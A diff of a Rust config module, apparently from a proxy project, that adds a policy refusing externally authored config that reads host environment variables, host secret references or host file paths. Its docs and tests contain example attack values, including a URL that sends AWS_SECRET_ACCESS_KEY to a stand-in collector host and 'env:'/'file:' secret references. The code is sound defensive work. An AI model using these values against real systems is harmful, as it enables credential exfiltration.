@@ -20,11 +20,17 @@
 //!
 //! While every byte of the document is written by the operator who runs
 //! the proxy, that is defensible: the operator already has the
-//! environment. Config aggregation breaks the assumption. Once a
-//! fragment authored in another repository is composed into the
-//! document, an unrestricted reader turns a config write permission into
-//! a read of every secret in the aggregator's environment, which is
-//! exactly where credentials live. A fragment shipping
+//! environment. That assumption is already false, and was before config
+//! aggregation was designed. A `source:` block's `kind: git` compiles a
+//! document authored by whoever can push to that repository, and a
+//! config-authority subscriber compiles a document authored by the
+//! authority. Both go through the same unrestricted passes. Config
+//! aggregation adds a third case rather than creating the first one.
+//!
+//! In each of them an unrestricted reader turns a config write
+//! permission into a read of every secret in the compiling host's
+//! environment, which is exactly where credentials live. A document
+//! shipping
 //!
 //! ```yaml
 //! action:
@@ -32,7 +38,32 @@
 //!   url: "https://collect.example/${AWS_SECRET_ACCESS_KEY}"
 //! ```
 //!
-//! exfiltrates on the next compose.
+//! exfiltrates on the next compile.
+//!
+//! # The half template syntax cannot see
+//!
+//! Template forms are not the only way a document reads its host, and a
+//! boundary that stopped only those would refuse one spelling of an
+//! attack while waving through the other. Three more forms carry no
+//! `${` and no `{{` at all:
+//!
+//! * `env:NAME` and the legacy `vault://env/NAME` alias are secret
+//!   references the process resolver reads out of the environment at
+//!   config load
+//!   (`crates/sbproxy-vault/src/resolver.rs:135-165`). `api_key:
+//!   "env:AWS_SECRET_ACCESS_KEY"` is the attack above with the quotes
+//!   moved.
+//! * `file:PATH` is the same thing against the filesystem.
+//! * `rego_module_path` and `module_path` name a host path the compiler
+//!   opens and inlines into the compiled config
+//!   (`crates/sbproxy-config/src/compiler.rs:590`).
+//!
+//! [`ConfinementPolicy`] withholds all three from a fragment, and the
+//! last two from a whole document fetched from elsewhere. Provider-URI
+//! references (`secret://`, `vault://<backend>/`, `awssm://`) are
+//! deliberately still allowed: each resolves only against a backend the
+//! operator declared under `proxy.secrets`, which is a path no
+//! externally authored document may set.
 //!
 //! # The shape, and why this one
 //!
@@ -141,12 +172,35 @@
 //!
 //! It does not change the fleet-wide passes. Operator-authored config
 //! keeps today's behavior exactly, `${VAR:-default}` shell semantics
-//! included. Confinement is opt-in at the call site, and the call site
-//! is whatever composes an externally authored fragment.
+//! included. Confinement applies where a caller asks for it, and the
+//! callers are the three places config text arrives from a party that
+//! does not own the compiling host: the git arm of
+//! [`crate::source`]'s loader, `validate_publish_payload` on the config
+//! authority, and the subscriber's merge of a remote bundle.
+//!
+//! # What this boundary does not stop, stated rather than implied
+//!
+//! [`ConfinementPolicy::remote_document`] still allows `${VAR}`, so a
+//! git-sourced document or an authority bundle can name a process
+//! variable that resolves on the node. The existing
+//! [`crate::unresolved_env_references`] gate only refuses a reference
+//! that *fails* to resolve, so one that succeeds is invisible to it.
+//! Closing that needs the node's own operator to declare which variable
+//! names a remote document may name, which is a config key this module
+//! does not add and cannot invent: defaulting it to "none" would break
+//! every git-sourced fleet on upgrade, and defaulting it to "any" is the
+//! behavior described here. A fragment has no such gap, because
+//! [`ConfinementPolicy::sealed`] allows no environment name at all.
+//!
+//! The mirror of `sbproxy-vault`'s host-backed reference set is a mirror
+//! and not a call, because `sbproxy-config` does not depend on that
+//! crate. See `crate::types::host_backed_secret_reference` for what
+//! holds the two in step and what it cannot see.
 
 use std::collections::HashMap;
 
 use crate::compiler::{env_references_in, lookup_variable_path};
+use crate::types::{host_backed_secret_reference, HostSecretSource};
 
 /// Keys whose value is an executed or evaluated script body rather than
 /// config text.
@@ -166,6 +220,113 @@ const SCRIPT_BODY_KEYS: &[&str] = &["lua_script", "js_script", "rego_module"];
 /// modifier context, never from the environment, and the fleet-wide pass
 /// leaves it literal too.
 const RESOLVABLE_BRACE_PREFIXES: &[&str] = &["env.", "vars.", "variables."];
+
+/// Keys whose value is a path the compiler reads off the host
+/// filesystem and inlines into the compiled config, paired with the key
+/// that carries the same content inline.
+///
+/// `rego_module_path` is read by `resolve_rego_modifier_module`
+/// (`crates/sbproxy-config/src/compiler.rs:590`) at compile and again on
+/// every reload; `module_path` is its spelling on `policy: rego` and on
+/// `transforms[] type: wasm`. A document that may name one of these can
+/// name any path the proxy process can open, which is a host-file read
+/// handed to whoever writes the document. The root config keeps the
+/// power because the operator owns the filesystem.
+const HOST_FILE_KEYS: &[(&str, &str)] = &[
+    ("rego_module_path", "rego_module"),
+    ("module_path", "module"),
+];
+
+/// What an externally authored document may do inside the confined
+/// boundary.
+///
+/// Three powers the root operator config keeps and this boundary hands
+/// out one at a time, because the party that writes the document is not
+/// the party that owns the host it compiles on:
+///
+/// * naming a process variable in a template form,
+/// * using a secret reference that reads the host directly
+///   (`env:NAME`, `vault://env/NAME`, `file:PATH`),
+/// * inlining a host file by path (`rego_module_path`, `module_path`).
+///
+/// [`ConfinementPolicy::sealed`] grants none of them and is what a
+/// fragment gets. [`ConfinementPolicy::remote_document`] grants the
+/// first only, and is what a whole document fetched from a git
+/// repository or served by a config authority gets; see that
+/// constructor for why the first one stays.
+#[derive(Debug, Clone)]
+pub struct ConfinementPolicy {
+    /// `Some` means `{{vars.X}}` resolves against these bindings and an
+    /// unbound name is an error. `None` means `{{ }}` is left exactly as
+    /// authored, for a document whose variables are resolved later by
+    /// the fleet-wide pass against the origin they land on.
+    inputs: Option<HashMap<String, serde_json::Value>>,
+    /// Whether the document may name a process variable through
+    /// `${VAR}` or `{{env.X}}`.
+    process_environment: bool,
+    /// Whether the document may carry a host-backed secret reference.
+    host_backed_secrets: bool,
+    /// Whether the document may inline a host file by path.
+    host_file_inlining: bool,
+}
+
+impl ConfinementPolicy {
+    /// No process environment, no host-backed secret reference, no host
+    /// file, and no variable the caller did not bind. What a fragment
+    /// authored in another repository gets.
+    #[must_use]
+    pub fn sealed() -> Self {
+        Self {
+            inputs: Some(HashMap::new()),
+            process_environment: false,
+            host_backed_secrets: false,
+            host_file_inlining: false,
+        }
+    }
+
+    /// [`Self::sealed`] plus the inputs the caller binds for
+    /// `{{vars.X}}`.
+    #[must_use]
+    pub fn with_inputs(inputs: HashMap<String, serde_json::Value>) -> Self {
+        Self {
+            inputs: Some(inputs),
+            ..Self::sealed()
+        }
+    }
+
+    /// A whole document fetched from a git repository or served by a
+    /// config authority: `${VAR}` keeps working, host-backed secret
+    /// references and host-file inlining do not.
+    ///
+    /// The asymmetry is deliberate and each half has a reason.
+    ///
+    /// `${VAR}` stays because it is the documented and only supported
+    /// way to run one shared document across a fleet: the document names
+    /// the per-node values and each host exports them (see "Node
+    /// identity in a shared repository" in docs/configuration.md).
+    /// Sealing it would break every git-sourced fleet on upgrade, which
+    /// is a breaking change wearing a default's clothes. Its residual
+    /// risk is stated in the module docs rather than hidden.
+    ///
+    /// The other two go, and nothing breaks, because neither is a
+    /// documented power of a remote document and neither is exercised
+    /// anywhere in this tree. They are also the two that
+    /// [`crate::AUTHORITY_DENIED_PATHS`] already reasons about at the
+    /// path level: `proxy.secrets` is denied to an authority precisely
+    /// because the node owns its own secret backends and filesystem.
+    /// Sealing `env:`, `vault://env/` and `file:` applies that same rule
+    /// to values instead of paths, which is where the deny list could
+    /// not reach.
+    #[must_use]
+    pub fn remote_document() -> Self {
+        Self {
+            inputs: None,
+            process_environment: true,
+            host_backed_secrets: false,
+            host_file_inlining: false,
+        }
+    }
+}
 
 /// A confined fragment was refused. Every variant names the fragment and
 /// the field path, and none of them carries a value read from the
@@ -264,10 +425,45 @@ pub enum ConfinedTemplateError {
         /// `(none)`. Names only: a binding value can be a credential.
         bound: String,
     },
+    /// The document carries a secret reference that reads the host
+    /// directly rather than a backend the operator declared.
+    ///
+    /// `env:NAME` and the legacy `vault://env/NAME` alias carry no
+    /// template syntax at all, so the template scan cannot see them;
+    /// they are the same environment read spelled a different way, and
+    /// `file:PATH` is the filesystem equivalent.
+    #[error(
+        "externally authored config `{fragment}` sets `{path}` to a `{form}` secret          reference, which resolves from {reads} on whichever machine compiles the document.          The party that writes this document is not the party that owns that host, so the          reference is refused rather than resolved: without this, a write to this document          would be a read of the compiling host's credentials. Declare the value in the root          config the operator owns, or name a backend the operator declared under          `proxy.secrets`. See the `Confined fragments` section of docs/configuration.md."
+    )]
+    HostSecretReference {
+        /// Caller-supplied label for the document, for the operator.
+        fragment: String,
+        /// Dotted path to the offending field.
+        path: String,
+        /// The reference spelling, e.g. `env:NAME`. Never the value, and
+        /// never the variable or path the reference names: the name is
+        /// enough of a pointer for the author, who wrote it.
+        form: &'static str,
+        /// What that spelling reads, e.g. `the process environment`.
+        reads: &'static str,
+    },
+    /// The document names a host filesystem path the compiler would read
+    /// and inline.
+    #[error(
+        "externally authored config `{fragment}` sets `{path}`, which the compiler reads off          the host filesystem and inlines. A document authored somewhere other than the host          it compiles on may not name a path on that host: the file belongs to whoever runs          the proxy. Carry the source inline under `{inline_key}` instead, or set the path in          the root config. See the `Confined fragments` section of docs/configuration.md."
+    )]
+    HostFileInlining {
+        /// Caller-supplied label for the document, for the operator.
+        fragment: String,
+        /// Dotted path to the offending key.
+        path: String,
+        /// The key carrying the same content inline, for the remedy.
+        inline_key: &'static str,
+    },
 }
 
-/// Resolve an externally authored config fragment against a binding set,
-/// and nothing else.
+/// Resolve an externally authored config fragment against a binding
+/// set, and nothing else.
 ///
 /// `fragment` is a label for error messages: whatever identifies the
 /// fragment to the operator (a repository and path, an `origin_sources`
@@ -277,11 +473,16 @@ pub enum ConfinedTemplateError {
 /// walks nested JSON objects with the rest, the same way origin
 /// `variables:` resolve.
 ///
+/// Shorthand for [`ConfinementPolicy::with_inputs`] over the same walk
+/// [`check_confined_document`] runs, keeping the resolved text instead
+/// of discarding it.
+///
 /// Returns the resolved fragment as YAML, ready to compose. The result
-/// carries no live `${VAR}`, no resolvable `{{env.X}}`, and no
-/// resolvable `{{vars.X}}`, so composing it into a document and handing
-/// that document to [`crate::compile_config`] cannot resolve any of the
-/// fragment's text against the process environment.
+/// carries no live `${VAR}`, no resolvable `{{env.X}}`, no resolvable
+/// `{{vars.X}}`, no host-backed secret reference, and no host file path,
+/// so composing it into a document and handing that document to
+/// [`crate::compile_config`] cannot reach the process environment or the
+/// host filesystem through anything the fragment wrote.
 ///
 /// The returned YAML is re-serialized from the parsed value tree, so
 /// comments and formatting from the fragment do not survive. That is
@@ -292,32 +493,67 @@ pub enum ConfinedTemplateError {
 /// # Errors
 ///
 /// Returns a [`ConfinedTemplateError`] naming the fragment, the field
-/// path, and the variable, for a fragment that does not parse, carries a
-/// YAML tag, references the process environment in any form, or
-/// references an input outside `bindings`.
+/// path, and the variable or form, for a fragment that does not parse,
+/// carries a YAML tag, references the process environment in any form,
+/// carries a host-backed secret reference, inlines a host file by path,
+/// or references an input outside `bindings`.
 pub fn resolve_confined_fragment(
     fragment: &str,
     yaml: &str,
     bindings: &HashMap<String, serde_json::Value>,
 ) -> Result<String, ConfinedTemplateError> {
-    let mut root: serde_yaml::Value =
-        serde_yaml::from_str(yaml).map_err(|source| ConfinedTemplateError::Parse {
-            fragment: fragment.to_string(),
-            source,
-        })?;
-    let resolver = Resolver {
-        fragment,
-        bindings,
-        bound_names: bound_names(bindings),
-    };
-    resolver.walk(&mut root, "", false)?;
+    let policy = ConfinementPolicy::with_inputs(bindings.clone());
+    let resolved = confine(fragment, yaml, &policy)?;
     // Serializing a parsed value tree cannot fail on any value that came
     // out of the parser, but the signature is fallible; report it the
     // same way a parse failure is reported rather than unwrapping.
-    serde_yaml::to_string(&root).map_err(|source| ConfinedTemplateError::Parse {
+    serde_yaml::to_string(&resolved).map_err(|source| ConfinedTemplateError::Parse {
         fragment: fragment.to_string(),
         source,
     })
+}
+
+/// Check a whole externally authored document against `policy` without
+/// rewriting a byte of it.
+///
+/// This is the entry point for a document that is already complete: one
+/// fetched from a git repository through a `source:` block, one a config
+/// authority is about to publish, and one a subscriber has merged over
+/// its local base. Those documents are signed, digested, or diffed by
+/// their callers, so returning modified text would be wrong; the walk
+/// runs over a throwaway parse and only the refusal escapes.
+///
+/// # Errors
+///
+/// Returns a [`ConfinedTemplateError`] naming the document, the field
+/// path, and the offending form.
+pub fn check_confined_document(
+    label: &str,
+    yaml: &str,
+    policy: &ConfinementPolicy,
+) -> Result<(), ConfinedTemplateError> {
+    confine(label, yaml, policy).map(|_| ())
+}
+
+/// The one confined walk. Both entry points above are this function plus
+/// a decision about what to do with its result.
+fn confine(
+    label: &str,
+    yaml: &str,
+    policy: &ConfinementPolicy,
+) -> Result<serde_yaml::Value, ConfinedTemplateError> {
+    let mut root: serde_yaml::Value =
+        serde_yaml::from_str(yaml).map_err(|source| ConfinedTemplateError::Parse {
+            fragment: label.to_string(),
+            source,
+        })?;
+    let resolver = Resolver {
+        fragment: label,
+        policy,
+        bound_names: policy.inputs.as_ref().map_or_else(String::new, bound_names),
+    };
+    resolver.walk(&mut root, "", false)?;
+    Ok(root)
 }
 
 /// The bound input names, sorted, for an error message. Names only.
@@ -334,16 +570,16 @@ fn bound_names(bindings: &HashMap<String, serde_json::Value>) -> String {
 /// four arguments through every frame.
 struct Resolver<'a> {
     fragment: &'a str,
-    bindings: &'a HashMap<String, serde_json::Value>,
+    policy: &'a ConfinementPolicy,
     bound_names: String,
 }
 
 impl Resolver<'_> {
-    /// Resolve every string in `value` in place.
+    /// Resolve and check every string in `value` in place.
     ///
     /// `in_script_body` is set once the walk has descended into a
-    /// [`SCRIPT_BODY_KEYS`] key and stays set for that whole subtree,
-    /// matching how `interpolate_config_vars` skips one.
+    /// script-body key and stays set for that whole subtree, matching
+    /// how `interpolate_config_vars` skips one.
     fn walk(
         &self,
         value: &mut serde_yaml::Value,
@@ -368,21 +604,37 @@ impl Resolver<'_> {
                 }
             }
             serde_yaml::Value::Mapping(map) => {
+                // Collect the keys first so the key subtree can be
+                // walked with the same code that walks a value. A key is
+                // config text too, and the pre-parse pass on the
+                // composed document substitutes inside one:
+                // `"${AWS_SECRET_ACCESS_KEY}": v` would exfiltrate
+                // through a header name. Scanning only `key.as_str()`
+                // left the YAML explicit-key form
+                // (`? [ "${VAR}" ]` / `: {}`) unscanned, which is a
+                // detector narrower than its enforcer at exactly the
+                // spot this pass claims to have widened
+                // (WOR-2433 review).
+                let mut keys: Vec<serde_yaml::Value> = map.keys().cloned().collect();
+                for key in &mut keys {
+                    let key_name = key.as_str().map_or_else(|| "?".to_string(), str::to_owned);
+                    let child = join_path(path, &key_name);
+                    self.check_key(&child, key)?;
+                }
                 for (key, val) in map.iter_mut() {
                     let key_name = key.as_str().map_or_else(|| "?".to_string(), str::to_owned);
                     let child = join_path(path, &key_name);
-                    // A mapping KEY is text too, and the pre-parse pass
-                    // on the composed document substitutes inside one:
-                    // `"${AWS_SECRET_ACCESS_KEY}": v` would exfiltrate
-                    // through a header name. No later pass resolves
-                    // `{{ }}` in a key, so keys are scanned for `${VAR}`
-                    // and never substituted. Scanning values alone here
-                    // would be a detector narrower than its enforcer.
-                    if let Some(key_text) = key.as_str() {
-                        self.refuse_env_references(
-                            &format!("{} (mapping key)", shown_path(&child)),
-                            key_text,
-                        )?;
+                    if let Some((_, inline_key)) = HOST_FILE_KEYS
+                        .iter()
+                        .find(|(name, _)| *name == key_name.as_str())
+                    {
+                        if !self.policy.host_file_inlining {
+                            return Err(ConfinedTemplateError::HostFileInlining {
+                                fragment: self.fragment.to_string(),
+                                path: shown_path(&child),
+                                inline_key,
+                            });
+                        }
                     }
                     let script = in_script_body || SCRIPT_BODY_KEYS.contains(&key_name.as_str());
                     self.walk(val, &child, script)?;
@@ -393,8 +645,49 @@ impl Resolver<'_> {
         Ok(())
     }
 
-    /// Resolve one string: substitute the bound `{{vars.X}}` inputs,
-    /// then refuse anything a later pass could still resolve.
+    /// Check a mapping key, whatever shape it has.
+    ///
+    /// A key is never substituted: no later pass resolves `{{ }}` in key
+    /// position, so rewriting one would be wider than the enforcer. It
+    /// is scanned for everything a later pass *would* act on, and the
+    /// scan recurses, so a sequence or a nested mapping in key position
+    /// is covered rather than skipped.
+    fn check_key(&self, path: &str, key: &serde_yaml::Value) -> Result<(), ConfinedTemplateError> {
+        match key {
+            serde_yaml::Value::Tagged(tagged) => Err(ConfinedTemplateError::YamlTag {
+                fragment: self.fragment.to_string(),
+                path: format!("{} (mapping key)", shown_path(path)),
+                tag: tagged.tag.to_string(),
+            }),
+            serde_yaml::Value::String(text) => {
+                let shown = format!("{} (mapping key)", shown_path(path));
+                self.refuse_env_references(&shown, text)?;
+                self.refuse_host_secret_reference(&shown, text)
+            }
+            serde_yaml::Value::Sequence(seq) => {
+                for (index, item) in seq.iter().enumerate() {
+                    self.check_key(&join_path(path, &index.to_string()), item)?;
+                }
+                Ok(())
+            }
+            serde_yaml::Value::Mapping(map) => {
+                for (nested_key, nested_value) in map {
+                    let name = nested_key
+                        .as_str()
+                        .map_or_else(|| "?".to_string(), str::to_owned);
+                    let child = join_path(path, &name);
+                    self.check_key(&child, nested_key)?;
+                    self.check_key(&child, nested_value)?;
+                }
+                Ok(())
+            }
+            _ => Ok(()),
+        }
+    }
+
+    /// Resolve one string: substitute the bound `{{vars.X}}` inputs when
+    /// the policy binds any, then refuse anything the policy withholds
+    /// that a later pass could still act on.
     fn resolve_string(
         &self,
         path: &str,
@@ -402,24 +695,25 @@ impl Resolver<'_> {
         in_script_body: bool,
     ) -> Result<String, ConfinedTemplateError> {
         let shown = shown_path(path);
-        let resolved = if in_script_body {
-            // No `{{ }}` substitution inside a script body, matching
-            // `interpolate_config_vars`. Nothing resolves `{{ }}` there
-            // later either, so a `{{env.X}}` in a Lua string is inert
-            // text and stays as authored.
-            input.to_string()
-        } else {
+        // A script body is opaque: no `{{ }}` substitution, matching
+        // `interpolate_config_vars`. Nothing resolves `{{ }}` there
+        // later either, so a `{{env.X}}` in a Lua string is inert text
+        // and stays as authored.
+        let substitute = !in_script_body && self.policy.inputs.is_some();
+        let resolved = if substitute {
             self.substitute_inputs(&shown, input)?
+        } else {
+            input.to_string()
         };
         // Post-substitution, not pre: a binding whose value contains
         // `$` or `{` can synthesize a live placeholder that was not in
-        // the fragment as authored. `"${{{vars.name}}}"` with `name`
-        // bound to `AWS_SECRET_ACCESS_KEY` produces a live `${...}`
-        // that a pre-substitution scan would never see.
+        // the fragment as authored. A pre-substitution scan would never
+        // see it.
         self.refuse_env_references(&shown, &resolved)?;
-        if !in_script_body {
+        if substitute {
             self.refuse_resolvable_braces(&shown, &resolved)?;
         }
+        self.refuse_host_secret_reference(&shown, &resolved)?;
         Ok(resolved)
     }
 
@@ -433,6 +727,10 @@ impl Resolver<'_> {
         shown_path: &str,
         input: &str,
     ) -> Result<String, ConfinedTemplateError> {
+        let bindings = match self.policy.inputs.as_ref() {
+            Some(bindings) => bindings,
+            None => return Ok(input.to_string()),
+        };
         let mut result = String::with_capacity(input.len());
         let mut rest = input;
         while let Some(start) = rest.find("{{") {
@@ -447,7 +745,7 @@ impl Resolver<'_> {
                 .strip_prefix("vars.")
                 .or_else(|| key.strip_prefix("variables."))
             {
-                match lookup_variable_path(self.bindings, name) {
+                match lookup_variable_path(bindings, name) {
                     Some(serde_json::Value::String(s)) => result.push_str(s),
                     Some(other) => result.push_str(&other.to_string()),
                     None => {
@@ -460,11 +758,17 @@ impl Resolver<'_> {
                     }
                 }
             } else if let Some(name) = key.strip_prefix("env.") {
-                return Err(ConfinedTemplateError::EnvTemplate {
-                    fragment: self.fragment.to_string(),
-                    path: shown_path.to_string(),
-                    variable: name.to_string(),
-                });
+                if self.policy.process_environment {
+                    result.push_str("{{");
+                    result.push_str(&after_open[..end]);
+                    result.push_str("}}");
+                } else {
+                    return Err(ConfinedTemplateError::EnvTemplate {
+                        fragment: self.fragment.to_string(),
+                        path: shown_path.to_string(),
+                        variable: name.to_string(),
+                    });
+                }
             } else {
                 result.push_str("{{");
                 result.push_str(&after_open[..end]);
@@ -476,18 +780,22 @@ impl Resolver<'_> {
         Ok(result)
     }
 
-    /// Refuse every live `${VAR}` in `text`.
+    /// Refuse every live `${VAR}` in `text`, unless the policy grants
+    /// the process environment.
     ///
-    /// "Live" is decided by [`env_references_in`], the same scanner the
+    /// "Live" is decided by `env_references_in`, the same scanner the
     /// fleet-wide hazard report runs, so this refuses exactly the
     /// placeholders `interpolate_env_vars` would resolve from the
-    /// environment: no more (`${args.id}`, `$${VAR}`, `${method}` stay
-    /// literal) and no less.
+    /// environment: no more (`${args.id}`, `$${VAR}`, `${method}` and
+    /// the documented access-log vocabulary stay literal) and no less.
     fn refuse_env_references(
         &self,
         shown_path: &str,
         text: &str,
     ) -> Result<(), ConfinedTemplateError> {
+        if self.policy.process_environment {
+            return Ok(());
+        }
         if let Some(reference) = env_references_in(text).first() {
             // `${NAME}` / `${NAME:-default}` -> `NAME`. The default is
             // dropped from the message: the variable is what the author
@@ -499,6 +807,49 @@ impl Resolver<'_> {
                 path: shown_path.to_string(),
                 variable: name.to_string(),
                 variable_escaped: format!("${reference}"),
+            });
+        }
+        Ok(())
+    }
+
+    /// Refuse a secret reference the process resolver reads straight off
+    /// the host, unless the policy grants that.
+    ///
+    /// This is the half of the boundary the template scan cannot see:
+    /// `env:AWS_SECRET_ACCESS_KEY` carries no `${` and no `{{`, passes
+    /// every template check untouched, and is read out of the process
+    /// environment by `sbproxy-vault`'s resolver at config load. The
+    /// module's own worked attack, `url:
+    /// "https://collect.example/${AWS_SECRET_ACCESS_KEY}"`, was refused
+    /// while the same attack spelled `api_key: "env:AWS_SECRET_ACCESS_KEY"`
+    /// was not (WOR-2433 review).
+    ///
+    /// Unlike the `{{ }}` substitution, this runs inside a script body
+    /// too, which is one place it is wider than the resolver: nothing
+    /// resolves a secret reference out of a Lua or Rego body. The width
+    /// costs nothing in practice, because the resolver matches a whole
+    /// value and a script body would have to *begin* with `env:`,
+    /// `file:` or `vault://env/` to trip it, and narrowing it would
+    /// mean this walk had to carry the list of fields on which a secret
+    /// reference is resolved, which is a list that drifts.
+    fn refuse_host_secret_reference(
+        &self,
+        shown_path: &str,
+        text: &str,
+    ) -> Result<(), ConfinedTemplateError> {
+        if self.policy.host_backed_secrets {
+            return Ok(());
+        }
+        if let Some(source) = host_backed_secret_reference(text) {
+            // `source.form()` and `source.reads()` are static strings;
+            // neither the referenced name nor anything resolved from it
+            // is read here, let alone rendered.
+            let _: HostSecretSource = source;
+            return Err(ConfinedTemplateError::HostSecretReference {
+                fragment: self.fragment.to_string(),
+                path: shown_path.to_string(),
+                form: source.form(),
+                reads: source.reads(),
             });
         }
         Ok(())
@@ -836,6 +1187,218 @@ mod tests {
     }
 
     #[test]
+    fn a_fragment_may_not_use_a_host_backed_secret_reference() {
+        let _env = secret_env();
+        // The attack the template scan cannot see. No `${`, no `{{`, and
+        // the process resolver reads it straight out of the environment
+        // at config load. Same shape as `examples/keys-inbound-headers`.
+        for (value, form_name) in [
+            (format!("env:{SECRET_VAR}"), "env:NAME"),
+            (format!("vault://env/{SECRET_VAR}"), "vault://env/NAME"),
+            ("file:/etc/sbproxy/aws-creds".to_string(), "file:PATH"),
+            // The same read spelled as a URL. `strip_prefix("file:")`
+            // hands the resolver `///etc/...`, which POSIX resolves to
+            // `/etc/...`, so a mirror that skipped `file://` would have
+            // refused one spelling and passed the other.
+            ("file:///etc/sbproxy/aws-creds".to_string(), "file:PATH"),
+            // Leading whitespace does not smuggle one past either.
+            (format!("  env:{SECRET_VAR}"), "env:NAME"),
+        ] {
+            let fragment = serde_yaml::to_string(&serde_json::json!({
+                "action": { "type": "proxy", "url": "https://collect.attacker.example" },
+                "authentication": { "type": "api_key", "api_key": value },
+            }))
+            .expect("fixture serializes");
+            let error = match resolve_confined_fragment("acme/api", &fragment, &bindings(&[])) {
+                Ok(resolved) => panic!("`{value}` must be refused, resolved to {resolved}"),
+                Err(error) => error,
+            };
+            match &error {
+                ConfinedTemplateError::HostSecretReference {
+                    form, path: field, ..
+                } => {
+                    assert_eq!(*form, form_name);
+                    assert_eq!(field, "authentication.api_key");
+                }
+                other => {
+                    panic!("expected a HostSecretReference refusal for `{value}`, got {other:?}")
+                }
+            }
+            assert!(!error.to_string().contains(SECRET_VALUE));
+        }
+    }
+
+    #[test]
+    fn a_host_backed_secret_reference_names_the_form_and_never_the_value() {
+        let _env = secret_env();
+        let fragment =
+            format!("authentication:\n  type: api_key\n  api_key: \"env:{SECRET_VAR}\"\n");
+        let error = resolve_confined_fragment("acme/api", &fragment, &bindings(&[]))
+            .expect_err("`env:NAME` reads the process environment and must be refused");
+        match &error {
+            ConfinedTemplateError::HostSecretReference {
+                fragment,
+                path,
+                form,
+                reads,
+            } => {
+                assert_eq!(fragment, "acme/api");
+                assert_eq!(path, "authentication.api_key");
+                assert_eq!(*form, "env:NAME");
+                assert_eq!(*reads, "the process environment");
+            }
+            other => panic!("expected a HostSecretReference refusal, got {other:?}"),
+        }
+        let rendered = error.to_string();
+        assert!(
+            !rendered.contains(SECRET_VALUE),
+            "the refusal echoed the variable's value: {rendered}"
+        );
+        // Not even the variable NAME: the author wrote it, and the field
+        // path is the pointer they need.
+        assert!(!rendered.contains(SECRET_VAR), "{rendered}");
+    }
+
+    #[test]
+    fn an_operator_declared_backend_reference_still_resolves_in_a_fragment() {
+        // The refusal is scoped to references that read this host
+        // directly. A backend named under `proxy.secrets` is the
+        // operator's own declaration, and a fragment cannot set
+        // `proxy.secrets`, so naming one is not a fragment-controlled
+        // read.
+        for value in [
+            "secret://acme/openai",
+            "vault://acme-vault/openai",
+            "awssm://aws/prod-key",
+            "k8ssecret://k8s/ns/name",
+        ] {
+            let fragment = serde_yaml::to_string(&serde_json::json!({
+                "authentication": { "type": "api_key", "api_key": value },
+            }))
+            .expect("fixture serializes");
+            resolve_confined_fragment("acme/api", &fragment, &bindings(&[]))
+                .unwrap_or_else(|error| panic!("`{value}` must still resolve, got {error}"));
+        }
+    }
+
+    #[test]
+    fn a_fragment_may_not_inline_a_host_file_by_path() {
+        for (key, inline) in [
+            ("rego_module_path", "rego_module"),
+            ("module_path", "module"),
+        ] {
+            let fragment = serde_yaml::to_string(&serde_json::json!({
+                "request_modifiers": [{ key: "/etc/sbproxy/anything.rego" }],
+            }))
+            .expect("fixture serializes");
+            let error = match resolve_confined_fragment("acme/api", &fragment, &bindings(&[])) {
+                Ok(resolved) => {
+                    panic!("`{key}` names a host path and must be refused, resolved to {resolved}")
+                }
+                Err(error) => error,
+            };
+            match &error {
+                ConfinedTemplateError::HostFileInlining {
+                    path, inline_key, ..
+                } => {
+                    assert_eq!(path, &format!("request_modifiers.0.{key}"));
+                    assert_eq!(*inline_key, inline);
+                }
+                other => panic!("expected a HostFileInlining refusal, got {other:?}"),
+            }
+        }
+    }
+
+    #[test]
+    fn a_complex_mapping_key_naming_a_variable_is_refused() {
+        let _env = secret_env();
+        // A YAML explicit key whose value is a sequence. The walk used
+        // to scan `key.as_str()` only, so this shape went past the key
+        // scan entirely and was re-serialized with the placeholder
+        // intact for `interpolate_env_vars` to substitute later.
+        let fragment = format!("headers:\n  ? [ \"${{{SECRET_VAR}}}\" ]\n  : {{}}\n");
+        let error = resolve_confined_fragment("acme/api", &fragment, &bindings(&[]))
+            .expect_err("a complex mapping key must be scanned like any other text");
+        match &error {
+            ConfinedTemplateError::EnvReference { variable, path, .. } => {
+                assert_eq!(variable, SECRET_VAR);
+                assert!(path.contains("mapping key"), "{path}");
+            }
+            other => panic!("expected an EnvReference refusal, got {other:?}"),
+        }
+        assert!(!error.to_string().contains(SECRET_VALUE));
+    }
+
+    #[test]
+    fn a_host_backed_secret_reference_in_a_complex_key_is_refused() {
+        let fragment = "routes:\n  ? [ \"env:AWS_SECRET_ACCESS_KEY\" ]\n  : {}\n";
+        let error = resolve_confined_fragment("acme/api", fragment, &bindings(&[]))
+            .expect_err("a key is text too, and both scans run on it");
+        assert!(
+            matches!(error, ConfinedTemplateError::HostSecretReference { .. }),
+            "{error:?}"
+        );
+    }
+
+    #[test]
+    fn a_remote_document_keeps_env_interpolation_and_loses_the_other_two() {
+        let _env = secret_env();
+        let policy = ConfinementPolicy::remote_document();
+        // `${VAR}` is the documented and only supported way to run one
+        // shared document across a fleet, so it survives.
+        check_confined_document(
+            "acme/runtime-config",
+            &format!("proxy:\n  cluster:\n    node_id: \"${{{SECRET_VAR}}}\"\n"),
+            &policy,
+        )
+        .expect("a remote document may still name per-node variables");
+        // `{{vars.X}}` is left for the fleet-wide pass, not resolved
+        // here and not refused as unbound.
+        check_confined_document(
+            "acme/runtime-config",
+            "origins:\n  api:\n    action:\n      url: \"https://{{vars.upstream}}\"\n",
+            &policy,
+        )
+        .expect("a remote document's variables resolve later, against the origin");
+        // The two powers it never had.
+        let error = check_confined_document(
+            "acme/runtime-config",
+            &format!(
+                "origins:\n  api:\n    authentication:\n      api_key: \"env:{SECRET_VAR}\"\n"
+            ),
+            &policy,
+        )
+        .expect_err("a remote document may not read this node's environment");
+        assert!(
+            matches!(error, ConfinedTemplateError::HostSecretReference { .. }),
+            "{error:?}"
+        );
+        assert!(!error.to_string().contains(SECRET_VALUE));
+        let error = check_confined_document(
+            "acme/runtime-config",
+            "origins:\n  api:\n    request_modifiers:\n      - rego_module_path: /etc/x.rego\n",
+            &policy,
+        )
+        .expect_err("a remote document may not name a path on this node");
+        assert!(
+            matches!(error, ConfinedTemplateError::HostFileInlining { .. }),
+            "{error:?}"
+        );
+    }
+
+    #[test]
+    fn checking_a_document_never_rewrites_it() {
+        // The publish path signs a digest over the payload and the
+        // subscriber diffs it, so a check that returned modified text
+        // would be a correctness bug rather than a convenience.
+        let yaml = "origins:\n  api:\n    action:\n      url: \"https://{{vars.x}}/$${HOME}\"\n";
+        let before = yaml.to_string();
+        check_confined_document("acme/doc", yaml, &ConfinementPolicy::remote_document())
+            .expect("nothing here is refused");
+        assert_eq!(yaml, before);
+    }
+
+    #[test]
